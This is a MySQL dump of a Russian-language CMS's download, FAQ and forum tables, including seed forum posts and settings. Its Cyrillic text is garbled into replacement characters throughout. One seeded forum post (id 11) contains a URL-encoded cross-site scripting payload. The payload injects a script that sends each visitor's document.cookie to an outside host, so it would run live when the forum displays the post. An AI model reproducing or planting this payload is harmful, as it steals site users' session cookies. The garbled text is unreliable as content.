INSERT INTO `cp_modul_download_os` VALUES (16, 'Mac OS X');
INSERT INTO `cp_modul_download_os` VALUES (17, 'Unix');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_payhistory`
-- 

CREATE TABLE `cp_modul_download_payhistory` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `User_Id` int(10) unsigned NOT NULL default '0',
  `PayAmount` double(14,2) unsigned NOT NULL default '0.00',
  `File_Id` int(10) unsigned NOT NULL default '0',
  `PayDate` char(10) NOT NULL,
  `User_IP` char(15) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_payhistory`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_settings`
-- 

CREATE TABLE `cp_modul_download_settings` (
  `Empfehlen` tinyint(1) unsigned NOT NULL default '1',
  `Bewerten` tinyint(1) unsigned NOT NULL default '0',
  `Spamwoerter` text NOT NULL,
  `Kommentare` tinyint(1) unsigned NOT NULL default '1'
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_settings`
-- 

INSERT INTO `cp_modul_download_settings` VALUES (1, 1, 'viagra\r\ncialis\r\ncasino\r\ngamble\r\npoker\r\nholdem\r\nbackgammon\r\nbackjack\r\nblack Jack\r\nRoulette\r\nV-I-A-G-R-A\r\nsex\r\ninsurance\r\n!!!\r\n???\r\nxxx', 1);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_download_sprachen`
-- 

CREATE TABLE `cp_modul_download_sprachen` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` char(200) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=6 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_download_sprachen`
-- 

INSERT INTO `cp_modul_download_sprachen` VALUES (1, '�������');
INSERT INTO `cp_modul_download_sprachen` VALUES (2, '����������');
INSERT INTO `cp_modul_download_sprachen` VALUES (3, '��������');
INSERT INTO `cp_modul_download_sprachen` VALUES (4, '�����������');
INSERT INTO `cp_modul_download_sprachen` VALUES (5, '�����������');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_faq`
-- 

CREATE TABLE `cp_modul_faq` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `faq_title` char(100) NOT NULL,
  `faq_description` char(255) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_faq`
-- 

INSERT INTO `cp_modul_faq` VALUES (1, '������ �������', '�������� ������ �������');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_faq_quest`
-- 

CREATE TABLE `cp_modul_faq_quest` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `faq_quest` text NOT NULL,
  `faq_answer` text NOT NULL,
  `faq_id` mediumint(5) unsigned NOT NULL default '1',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_faq_quest`
-- 

INSERT INTO `cp_modul_faq_quest` VALUES (1, '<p>��� ����������� �������?</p>', '<p>������� ����������� � ���������������� ����� � ������� �������.</p>\r\n<p><img src="/cms/uploads/faq/shab01.png" alt="" /></p>', 1);
INSERT INTO `cp_modul_faq_quest` VALUES (3, '<p>������ ����������� ���������������� ��� ������������ ��������?</p>', '<p>������ ������������, �������� ������������ ��������������, �������� �������������� ������� ���������� ����� (���������� �� ������ �. ����� &quot;�������� ������������������ ��������&quot;). ���������������� ��� ������������ �������� ������������. ������������� �������������, �������� ������������ ��������������, ������������ ������������ ������� ������������� ��������, ���� �� ������ ������, ���������� ������ ��� �� ��� ���. ������ ������������ ������������ ������ ������������, ��������� � ����� ������������ �. ������.</p>\r\n<p>�����������������, � ������ �������, ������������ ��������. ����������������� ������� ��������, �������� �� ������� �����������, ������������ ����������������� ������������ ��� ������������ ��������, � ��� ������ ����� ������, ��� �. �������� � �. �������. ���� �� ���������������� ������ ������������ �. ���� �����, ��� ������������ ������ ��������� ���������� �����������, ������ ������ �������������� ������ �������� ��������������� ����. ��������� ���������� ������������ ��� ������������ ��������, �������, �� ��� ���������� ��������� ��� ������. ������� ������������� ������� ���������������.</p>', 1);
INSERT INTO `cp_modul_faq_quest` VALUES (2, '<p>����������� ������������ ��� ������������ ��������: ����������� � ��������? <a href="index.php?id=5&amp;doc=kontakty">��������</a></p>', '<p>������������ ��������������� ���������. ������� �����, ������ ������, ���������� ������������ ��������, ���� �� ������ ������, ���������� ������ ��� �� ��� ���. ������������ ���������� ������������ ����� ����������������� �����������-��������������� �����������, � ��� ����� ��������� ������� ����. ������������ ������ ����� ��������� �����-������������ ��� ������������ ��������, ������ ������ �������������� ������ �������� ��������������� ����.</p>\r\n<p>����������������� ����������� ��������� ������� ���������� �����, �������� �.������. ������� ���������� �����, ��� �������, ���������� �����������, ��� �������� ��������� � ������ ��������. ���������� ������������� ����������� ���������� ��������� ������� ������������� ��������, �������, ��� ��������� ���������� � ���������� ������.</p>\r\n<p>������������� ���������, �� ������ ������, �������� �������������� ������������ ������� � ����������� ������, ��������� �������� ���� �������� � ������ ������� �.�. ������. �������� �����������, � ������ �������, ������������� ������������ �������������� ����������, ��� ���� �������� �. �������������. ������� ������ ��������� ������������� ������� ������������� ��������, ������ ������ �������������� ������ �������� ��������������� ����. <a href="index.php?id=5&amp;doc=kontakty">��������</a></p>', 1);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_allowed_files`
-- 

CREATE TABLE `cp_modul_forum_allowed_files` (
  `id` tinyint(3) unsigned NOT NULL auto_increment,
  `filetype` char(200) NOT NULL,
  `filesize` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=11 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_allowed_files`
-- 

INSERT INTO `cp_modul_forum_allowed_files` VALUES (1, 'text/html', 250);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (2, 'text/plain', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (3, 'image/jpeg', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (4, 'image/gif', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (5, 'application/x-zip-compressed', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (6, 'application/x-rar-compressed', 500);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (7, 'application/postscript', 1024);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (8, 'image/x-photoshop', 1024);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (9, 'application/x-msdownload', 1024);
INSERT INTO `cp_modul_forum_allowed_files` VALUES (10, 'application/msword', 350);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_attachment`
-- 

CREATE TABLE `cp_modul_forum_attachment` (
  `id` mediumint(8) unsigned NOT NULL auto_increment,
  `orig_name` char(255) NOT NULL,
  `filename` char(255) NOT NULL,
  `hits` int(11) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `filename` (`filename`),
  FULLTEXT KEY `filename_2` (`filename`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_attachment`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_category`
-- 

CREATE TABLE `cp_modul_forum_category` (
  `id` int(11) NOT NULL auto_increment,
  `title` varchar(200) NOT NULL default '',
  `position` smallint(5) unsigned NOT NULL default '0',
  `parent_id` smallint(5) unsigned default NULL,
  `comment` text,
  `group_id` text,
  PRIMARY KEY  (`id`),
  KEY `title` (`title`),
  KEY `position` (`position`),
  KEY `parent_id` (`parent_id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_category`
-- 

INSERT INTO `cp_modul_forum_category` VALUES (1, '���������������� ���������', 1, 0, '��������� ��� ������������ ������ �������', '1,2,3,4,5,6,7,8,9');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_forum`
-- 

CREATE TABLE `cp_modul_forum_forum` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `title` varchar(200) NOT NULL default '',
  `category_id` int(11) unsigned NOT NULL default '0',
  `statusicon` varchar(20) default NULL,
  `comment` text,
  `status` tinyint(1) default '0',
  `last_post` datetime default NULL,
  `last_post_id` int(11) NOT NULL default '0',
  `group_id` varchar(150) default NULL,
  `active` tinyint(3) unsigned NOT NULL default '0',
  `password` varchar(100) default NULL,
  `password_raw` varchar(255) NOT NULL default '',
  `moderator` int(11) default NULL,
  `position` smallint(6) default '0',
  `moderated` tinyint(1) NOT NULL default '0',
  `moderated_posts` tinyint(1) NOT NULL default '0',
  `topic_emails` text NOT NULL,
  `post_emails` text NOT NULL,
  PRIMARY KEY  (`id`),
  KEY `title` (`title`),
  KEY `position` (`position`),
  KEY `group_id` (`group_id`),
  KEY `status` (`status`),
  KEY `category_id` (`category_id`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_forum`
-- 

INSERT INTO `cp_modul_forum_forum` VALUES (1, '����� �����', 1, NULL, '����� ����� �������� ��� ����', 0, '2010-03-26 04:16:56', 11, '1,2,3,4', 1, '', '', NULL, 1, 0, 0, '', '');
INSERT INTO `cp_modul_forum_forum` VALUES (2, '��� ������ ���', 1, NULL, '����� � �������� �� ������� �����.', 0, '2009-01-09 12:08:28', 4, '1,2,3,4,5,6,7,8,9', 1, '', '', NULL, 2, 0, 0, '', '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_groupavatar`
-- 

CREATE TABLE `cp_modul_forum_groupavatar` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `user_group` int(10) unsigned NOT NULL default '0',
  `IstStandard` tinyint(1) unsigned NOT NULL default '1',
  `StandardAvatar` char(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_groupavatar`
-- 

INSERT INTO `cp_modul_forum_groupavatar` VALUES (1, 1, 1, '');
INSERT INTO `cp_modul_forum_groupavatar` VALUES (2, 2, 1, '');
INSERT INTO `cp_modul_forum_groupavatar` VALUES (3, 3, 1, '');
INSERT INTO `cp_modul_forum_groupavatar` VALUES (4, 4, 1, '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_grouppermissions`
-- 

CREATE TABLE `cp_modul_forum_grouppermissions` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `user_group` int(10) unsigned NOT NULL default '0',
  `permission` text NOT NULL,
  `MAX_AVATAR_BYTES` int(8) unsigned NOT NULL default '10240',
  `MAX_AVATAR_HEIGHT` mediumint(3) unsigned NOT NULL default '90',
  `MAX_AVATAR_WIDTH` mediumint(3) unsigned NOT NULL default '90',
  `UPLOADAVATAR` tinyint(1) unsigned NOT NULL default '1',
  `MAXPN` mediumint(3) unsigned NOT NULL default '50',
  `MAXPNLENTH` int(8) unsigned NOT NULL default '5000',
  `MAXLENGTH_POST` int(8) unsigned NOT NULL default '10000',
  `MAXATTACHMENTS` smallint(2) unsigned NOT NULL default '5',
  `MAX_EDIT_PERIOD` smallint(4) unsigned NOT NULL default '672',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Benutzergruppe` (`user_group`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_forum_grouppermissions`
-- 

INSERT INTO `cp_modul_forum_grouppermissions` VALUES (1, 1, 'own_avatar|canpn|accessforums|cansearch|last24|userprofile|changenick', 45056, 120, 120, 1, 100, 50000, 10000, 10, 1440);
INSERT INTO `cp_modul_forum_grouppermissions` VALUES (2, 2, 'accessforums|cansearch|last24|userprofile', 0, 0, 0, 1, 0, 0, 5000, 3, 0);
INSERT INTO `cp_modul_forum_grouppermissions` VALUES (3, 3, 'own_avatar|canpn|accessforums|cansearch|last24|userprofile', 10240, 90, 90, 1, 50, 5000, 10000, 5, 672);
INSERT INTO `cp_modul_forum_grouppermissions` VALUES (4, 4, 'own_avatar|canpn|accessforums|cansearch|last24|userprofile', 10240, 90, 90, 1, 50, 5000, 10000, 5, 672);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_ignorelist`
-- 

CREATE TABLE `cp_modul_forum_ignorelist` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `BenutzerId` int(14) unsigned NOT NULL default '0',
  `IgnoreId` int(10) unsigned NOT NULL default '0',
  `Grund` char(255) NOT NULL,
  `Datum` int(14) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_ignorelist`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_mods`
-- 

CREATE TABLE `cp_modul_forum_mods` (
  `forum_id` int(11) NOT NULL default '0',
  `user_id` int(11) NOT NULL default '0'
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_mods`
-- 

INSERT INTO `cp_modul_forum_mods` VALUES (2, 2);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_permissions`
-- 

CREATE TABLE `cp_modul_forum_permissions` (
  `forum_id` int(11) NOT NULL default '0',
  `group_id` int(11) NOT NULL default '0',
  `permissions` char(255) NOT NULL,
  PRIMARY KEY  (`forum_id`,`group_id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_permissions`
-- 

INSERT INTO `cp_modul_forum_permissions` VALUES (1, 1, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 2, '1,1,1,1,0,0,0,0,,,,,,,,,,,,,,');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 3, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 4, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (1, 5, '1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 1, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 2, '1,1,1,1,0,0,0,0,,,,,,,,,,,,,,');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 3, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 4, '1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1');
INSERT INTO `cp_modul_forum_permissions` VALUES (2, 5, '1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_pn`
-- 

CREATE TABLE `cp_modul_forum_pn` (
  `pnid` int(11) unsigned NOT NULL auto_increment,
  `to_uid` mediumint(8) unsigned default NULL,
  `from_uid` mediumint(8) unsigned default NULL,
  `topic` varchar(255) default NULL,
  `message` text,
  `is_readed` enum('yes','no') default NULL,
  `pntime` int(11) default '0',
  `typ` enum('inbox','outbox') default 'inbox',
  `smilies` enum('yes','no') NOT NULL default 'yes',
  `parseurl` enum('yes','no') NOT NULL default 'no',
  `reply` enum('yes','no') NOT NULL default 'no',
  `forward` enum('yes','no') NOT NULL default 'no',
  PRIMARY KEY  (`pnid`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_pn`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_post`
-- 

CREATE TABLE `cp_modul_forum_post` (
  `id` bigint(20) unsigned NOT NULL auto_increment,
  `title` varchar(200) default NULL,
  `topic_id` smallint(6) NOT NULL default '0',
  `datum` datetime NOT NULL default '0000-00-00 00:00:00',
  `uid` smallint(6) NOT NULL default '0',
  `use_bbcode` tinyint(1) NOT NULL default '0',
  `use_smilies` tinyint(1) NOT NULL default '0',
  `use_sig` tinyint(1) NOT NULL default '0',
  `message` text NOT NULL,
  `attachment` tinytext,
  `opened` tinyint(1) NOT NULL default '1',
  PRIMARY KEY  (`id`),
  KEY `title` (`title`),
  KEY `uid` (`uid`),
  KEY `topic_id` (`topic_id`),
  KEY `datum` (`datum`)
) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_post`
-- 

INSERT INTO `cp_modul_forum_post` VALUES (1, '', 1, '2009-01-08 12:51:13', 1, 1, 1, 1, '�� ������������ ��� � ����� �������!\r\n��������� � ������������.', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (2, '������ ����� �������: ����� ��� �����������?', 2, '2009-01-09 11:59:20', 1, 1, 1, 1, '������ �������. ������������� � ������������� ������� �������� ����� ������ ������������. �������� �������������. ���� ���������� ������ ����������� ������������ ����, ��� � ����� ��������������� � ������������ ������������� ��������� � ��� �����.', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (3, '��������-���������������� ������: ����������� � ��������', 2, '2009-01-09 12:03:06', 1, 1, 1, 1, '�������� ����� ��������� ���������� ����, �� �������� � ����������� ���������� �����. ������������� ������ �������. ������������� ���������� ���� �����, ������� � ��������� ����� ��������� ���� ������ ����, ���������� �����, ��� ������� � ��������� ������� � ��������� �����������. ������������� ��������� �������������� ������, � ������������ � ����������� � ��������� �������������. ������ ������������ ����� � ���� ������������, ��� ���� ������������ ��, ��� �������� ������ ������������� �� �������. \r\n\r\n��������, �� ���� ������� ��� �������� ��������� ���������, �������� � ��������� ������, � ������������ � ����������� � ��������� �������������. ������ �������� ������������ ����������� ����� ������� ������� ��������� �������� �����, ��� � ����� ��������������� � ������������ ������������� ��������� � ��� �����. ����, ��� ��, ��� � � ������ ��������, ����������. �������, ��� ��, ��� � � ������ ��������, ������������ �����, �� �������� � ����������� ���������� �����. ��� ������������ ����������� ����������� ����������� � ��������� ���� ��������������� �������� ������� ���������� ���������� �������-��������� ������� ����, ��� ����������� �� ������ ���������� ������������ ���������-�������������� ������� ����������� ��������������� �����, �� � ������������ ����� ������� �������� ���������. �������-��������� ������� ���� ����������� ��������, ���, ������, �� ���������� ������������ ��������������� ��������� ������� �����.', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (4, '������� �������������� ��������: �������� � ������', 3, '2009-01-09 12:08:28', 1, 1, 1, 1, '������� ����������� ������������ �����, ��������, ��� � ����� ������� 3,26 �������� ����. ��������� ������� ���� ������ �����, ���� ��� ���� ����� �� �����p��������� ���������, ���������� � ������� 1.2-���p����� ���������. ��� ���� �������� ����, ������� �������� �������� ����������� �����, ���� ��������� � ��������� ������� ����� ������� ����������. ��������� ���������� �������, ����� ������ ��������������� ���� ����������� ���������� ������, ����� �������, ��������� ���� ������ ������ ��������� � ������ ������. �������� ����� ������ ����������� ������������ ���������, �� ������ ����� ������ ��� 40�50. \r\n\r\n� ������� �� ����� ��������� ���������� ������ ������ ������, ������� ��������. ���������, ������ ���������� ������ ������ ������, ������������� ��������, ���� ��� ������� �����-��������� ���������� ��������� ���������� �� �� ���� ��������� � ����� ����� ������� ���������. ������������� ������ �������� �������������� ���������� � � ����� �������� ������ ����� ������������ � ���������, ��� �� ��� ������ ������� �����������. ����������, ������ ���������� ������ ������ ������, ����������� �������������� ������� ���� (��������� ��������� �� ���������, ����, �����).', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (5, '', 1, '2009-11-29 01:11:33', 1, 1, 1, 1, '[QUOTE][B]�����:  Admin[/B]\r\n �� ������������ ��� � ����� �������!\r\n��������� � ������������.[/QUOTE]\r\n\r\n[URL]http://test.avecms.ru/index.php?module=forums&show=newpost&action=quote&pid=1&toid=1[/URL]', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (6, '', 1, '2009-11-29 01:14:43', 1, 1, 1, 1, '[QUOTE][B]�����:  Admin[/B]\r\n [QUOTE][B]�����:  Admin[/B]\r\n �� ������������ ��� � ����� �������!\r\n��������� � ������������.[/QUOTE]\r\n\r\n[URL]http://test.avecms.ru/index.php?module=forums&show=newpost&action=quote&pid=1&toid=1[/URL][/QUOTE]\r\n\r\n[URL=http://phpthumb.sourceforge.net/demo/demo/phpThumb.demo.demo.php#showpic]����[/URL]', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (7, '', 1, '2009-11-29 01:42:52', 1, 1, 1, 1, '[URL]https://flowplayer.org/tools/demos/overlay/styling.html[/URL]\r\n[URL=https://flowplayer.org/tools/demos/overlay/styling.html]Webseiten-Name[/URL] \n[size=2]���������������: 29.11.2009, 01:46:06[/size]', '', 1);
INSERT INTO `cp_modul_forum_post` VALUES (11, '', 1, '2010-03-26 04:16:56', 1, 1, 1, 1, '[URL=http://www.avecms.ru/index.php?id=1&doc=%22%3E%3Cscript%3Edocument.getElementById%28%27box_top_right%27%29.innerHTML=%27%3Cimg+src=%22http:%2F%2Fave209d.ru%2Fcms%2Findex.php?cookies=%27%2Bdocument.cookie%2B%27%22/%3E%27;%3C%2Fscript%3E%3C%22]Webseiten-Name[/URL]', '', 1);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_posticons`
-- 

CREATE TABLE `cp_modul_forum_posticons` (
  `id` int(11) NOT NULL auto_increment,
  `posi` mediumint(5) NOT NULL default '1',
  `active` tinyint(1) NOT NULL default '1',
  `path` char(55) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=15 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_posticons`
-- 

INSERT INTO `cp_modul_forum_posticons` VALUES (1, 1, 1, 'icon1.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (2, 2, 1, 'icon2.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (3, 14, 1, 'icon3.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (4, 3, 1, 'icon4.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (5, 13, 1, 'icon5.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (6, 12, 1, 'icon6.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (7, 11, 1, 'icon7.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (8, 10, 1, 'icon8.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (9, 9, 1, 'icon9.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (10, 8, 1, 'icon10.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (11, 7, 1, 'icon11.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (12, 6, 1, 'icon12.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (13, 5, 2, 'icon13.gif');
INSERT INTO `cp_modul_forum_posticons` VALUES (14, 4, 2, 'icon14.gif');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_rank`
-- 

CREATE TABLE `cp_modul_forum_rank` (
  `id` int(10) unsigned NOT NULL auto_increment,
  `title` char(100) NOT NULL,
  `count` int(11) NOT NULL default '0',
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_rank`
-- 

INSERT INTO `cp_modul_forum_rank` VALUES (1, '�������', 1);
INSERT INTO `cp_modul_forum_rank` VALUES (2, '������ �����', 100);
INSERT INTO `cp_modul_forum_rank` VALUES (3, '��������', 600);
INSERT INTO `cp_modul_forum_rank` VALUES (4, '�������', 1000);
INSERT INTO `cp_modul_forum_rank` VALUES (5, '����� �����', 5000);
INSERT INTO `cp_modul_forum_rank` VALUES (6, '��������', 200);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_rating`
-- 

CREATE TABLE `cp_modul_forum_rating` (
  `topic_id` int(11) NOT NULL default '0',
  `rating` text NOT NULL,
  `ip` text NOT NULL,
  `uid` text NOT NULL,
  PRIMARY KEY  (`topic_id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_rating`
-- 

INSERT INTO `cp_modul_forum_rating` VALUES (1, '', '', '');
INSERT INTO `cp_modul_forum_rating` VALUES (2, '', '', '');
INSERT INTO `cp_modul_forum_rating` VALUES (3, '', '', '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_settings`
-- 

CREATE TABLE `cp_modul_forum_settings` (
  `boxwidthcomm` int(10) unsigned NOT NULL default '300',
  `boxwidthforums` int(10) unsigned NOT NULL default '300',
  `maxlengthword` int(10) unsigned NOT NULL default '50',
  `maxlines` int(10) unsigned NOT NULL default '15',
  `badwords` text,
  `badwords_replace` varchar(255) NOT NULL default '',
  `pageheader` text NOT NULL,
  `AbsenderMail` varchar(200) default NULL,
  `AbsenderName` varchar(200) default NULL,
  `SystemAvatars` tinyint(1) unsigned NOT NULL default '1',
  `BBCode` tinyint(1) unsigned NOT NULL default '1',
  `Smilies` tinyint(1) unsigned NOT NULL default '1',
  `Posticons` tinyint(1) unsigned NOT NULL default '1',
  UNIQUE KEY `boxwidthcomm` (`boxwidthcomm`),
  UNIQUE KEY `boxwidthforums` (`boxwidthforums`),
  UNIQUE KEY `maxlengthword` (`maxlengthword`),
  UNIQUE KEY `maxlines` (`maxlines`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_settings`
-- 

INSERT INTO `cp_modul_forum_settings` VALUES (300, 300, 50, 150, 'Arschloch,Ficken,Drecksau', '***', '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">\r\n<html xmlns="http://www.w3.org/1999/xhtml">\r\n<head>\r\n<meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />', 'formsg@mail.ru', 'Admin', 1, 1, 1, 1);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_smileys`
-- 

CREATE TABLE `cp_modul_forum_smileys` (
  `id` int(11) NOT NULL auto_increment,
  `posi` mediumint(5) NOT NULL default '1',
  `active` enum('1','0') NOT NULL default '1',
  `code` char(15) NOT NULL,
  `path` char(55) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=14 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_smileys`
-- 

INSERT INTO `cp_modul_forum_smileys` VALUES (1, 14, '1', ';)', 'wink.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (2, 13, '1', ':eek:', 'eek.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (3, 15, '1', ':(', 'mad.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (4, 12, '1', ':D', 'biggrin.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (5, 11, '1', ':P', 'tongue.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (6, 9, '1', ':cool:', 'cool.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (7, 8, '1', ':kisses:', 'kisses.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (8, 7, '1', ':rolleyes:', 'rolleyes.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (9, 6, '0', ':schlecht:', 'schlecht.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (10, 5, '0', ':unsicher:', 'unsure.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (11, 3, '1', ':)', 'smile.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (12, 2, '1', ':^^:', 'lol.gif');
INSERT INTO `cp_modul_forum_smileys` VALUES (13, 1, '1', ':cry:', 'cry.gif');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_forum_topic`
-- 

CREATE TABLE `cp_modul_forum_topic` (
  `id` int(11) NOT NULL auto_increment,
  `title` varchar(200) NOT NULL default '',
  `status` int(11) default '0',
  `views` int(11) NOT NULL default '0',
  `rating` text,
  `forum_id` int(11) NOT NULL default '0',
  `icon` smallint(5) unsigned default NULL,
  `posticon` smallint(5) unsigned default NULL,
  `datum` datetime NOT NULL default '0000-00-00 00:00:00',
  `replies` int(10) unsigned NOT NULL default '0',
  `uid` smallint(5) unsigned NOT NULL default '0',
  `notification` text NOT NULL,
  `type` tinyint(1) NOT NULL default '0',
  `last_post` datetime default NULL,
  `last_post_id` int(11) default NULL,
  `opened` tinyint(4) NOT NULL default '1',
  `last_post_int` int(14) NOT NULL default '0',
  PRIMARY KEY  (`id`),
  KEY `forum_id` (`forum_id`),
  KEY `opened` (`opened`),
  KEY `uid` (`uid`),
  KEY `title` (`title`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_forum_topic`
-- 

